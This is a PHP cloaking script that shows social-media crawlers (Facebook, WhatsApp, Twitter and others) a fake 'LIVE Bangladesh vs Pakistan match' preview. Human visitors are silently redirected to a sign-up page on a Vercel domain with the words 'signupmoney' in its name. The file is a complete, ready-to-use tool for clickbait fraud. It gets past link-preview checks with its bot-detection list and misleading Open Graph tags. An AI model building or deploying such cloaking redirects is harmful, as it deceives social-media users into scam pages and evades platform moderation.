<?php
// ----------------- CONFIG -----------------
$targetUrl = 'https://signupmoney-fb.vercel.app'; // <-- আপনার টার্গেট URL
$title = "𝗟 𝗜 𝗩 𝗘 🔴 Bangladesh vs Pakistan 𝗟 𝗶 𝘃 𝗲 𝗠𝗮𝘁𝗰𝗵 𝗧𝗼𝗱𝗮𝘆 𝟮𝟬𝟮𝟱...four...four...four...wicket...wicket...wicket";
$description = "Live match updates and streaming info — Bangladesh vs Pakistan 2025.";
$imageUrl = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuhwbotOTQG-Js7ZRwILQZta5zHOTtTpUDnlu5kcw8LVhTRiL5Yc5eDLo859lvq7NUQBtJ7zd5yeQIrKcxD5dMuPvHxK7BTq_A3Oijp6LqbctrBKc6NJJf-HtLYizzeTdbbvuUIQcYQtzcwTdQ_htbVuvIEyGyg6RCkL8CcDlongFW8N2LEAv0jFbzpORy/s500/15309273009227021583.jpg";

// Browser redirect status for human users
$redirectStatusCode = 302; // change to 301 if you want permanent
// -------------------------------------------

function isSocialBot($ua) {
    if (!$ua) return false;
    $ua = strtolower($ua);
    $botSignatures = [
        'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot',
        'slackbot', 'whatsapp', 'telegrambot', 'discordbot',
        'embedly', 'pinterest', 'googlebot', 'bingbot', 'applebot'
    ];
    foreach ($botSignatures as $sig) {
        if (strpos($ua, $sig) !== false) return true;
    }
    return false;
}

$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

if (isSocialBot($userAgent)) {
    // Serve OG meta page for social crawlers.
    // IMPORTANT: set og:url to the target URL so the bot does NOT index your redirect URL.
    header('Content-Type: text/html; charset=utf-8');
    $escTitle = htmlspecialchars($title, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $escDesc  = htmlspecialchars($description, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $escImage = htmlspecialchars($imageUrl, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $escUrl   = htmlspecialchars($targetUrl, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

    echo '<!doctype html><html lang="en"><head><meta charset="utf-8">';
    echo "<title>{$escTitle}</title>\n";
    echo "<meta name=\"robots\" content=\"index,follow\" />\n";

    // Open Graph (set og:url to the actual target so bot links to that)
    echo "<meta property=\"og:type\" content=\"website\" />\n";
    echo "<meta property=\"og:title\" content=\"{$escTitle}\" />\n";
    echo "<meta property=\"og:description\" content=\"{$escDesc}\" />\n";
    echo "<meta property=\"og:image\" content=\"{$escImage}\" />\n";
    echo "<meta property=\"og:image:alt\" content=\"{$escTitle}\" />\n";
    echo "<meta property=\"og:url\" content=\"{$escUrl}\" />\n";

    // Twitter card
    echo "<meta name=\"twitter:card\" content=\"summary_large_image\" />\n";
    echo "<meta name=\"twitter:title\" content=\"{$escTitle}\" />\n";
    echo "<meta name=\"twitter:description\" content=\"{$escDesc}\" />\n";
    echo "<meta name=\"twitter:image\" content=\"{$escImage}\" />\n";

    // Canonical to the target (avoids bots indexing your redirect URL)
    echo "<link rel=\"canonical\" href=\"{$escUrl}\" />\n";

    // Minimal body so crawler can render preview if needed.
    echo "</head><body>";
    echo "<h1>{$escTitle}</h1>\n";
    echo "<p>{$escDesc}</p>\n";
    echo "<p><a href=\"{$escUrl}\">Open the match page</a></p>\n";
    echo "</body></html>";
    exit;
} else {
    // Regular browser -> immediate redirect to the target
    header("Location: $targetUrl", true, $redirectStatusCode);
    exit;
}
